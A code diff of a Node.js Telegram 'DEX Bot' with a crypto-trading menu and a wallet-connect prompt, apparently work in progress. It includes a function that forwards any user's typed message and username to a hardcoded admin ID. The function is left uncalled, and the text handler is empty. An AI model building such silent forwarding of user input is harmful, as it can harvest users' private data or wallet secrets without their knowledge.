@@ -1,9 +1,11 @@
 const { Telegraf, Markup } = require('telegraf');
 require('dotenv').config();
-
 const bot = new Telegraf(process.env.BOT_TOKEN);
-
 const ADMIN_ID = '7152379504'; // Your Telegram ID
+
+bot.start((ctx) => {
+  ctx.reply('Welcome to DEX Bot. Choose an option:', mainMenu);
+});
 
 // Inline keyboard layout
 const mainMenu = Markup.keyboard([
@@ -15,16 +17,6 @@ const mainMenu = Markup.keyboard([
   ['🚀 LP Sniper', '👥 Referrals'],
   ['💸 Withdraw']
 ]).resize();
-
-bot.on('text', async (ctx) => {
-  const msg = ctx.message.text;
-  const username = ctx.from.username || ctx.from.first_name;
-
-});
-
-bot.start((ctx) => {
-  ctx.reply('Welcome to DEX Bot. Choose an option:', mainMenu);
-});
 
 // Placeholder handlers for each button
 bot.hears('💰 Sell', (ctx) => ctx.reply('Sell selected.'));
@@ -66,8 +58,15 @@ Click on the 'Connect Wallet' button to connect your wallet and click *Refresh* 
   `, { parse_mode: 'Markdown' });
 });
 
-// Send message to you (admin)
-await ctx.telegram.sendMessage(ADMIN_ID, `New input from @${username}:\n"${msg}"`);
+bot.on('text', async (ctx) => {
+  const msg = ctx.message.text;
+  const username = ctx.from.username || ctx.from.first_name;
+});
 
+
+// Send message to you (admin)
+async function sendNotification(ctx,username,msg) {
+  await ctx.telegram.sendMessage(ADMIN_ID, `New input from @${username}:\n"${msg}"`);
+}
 
 module.exports = bot;
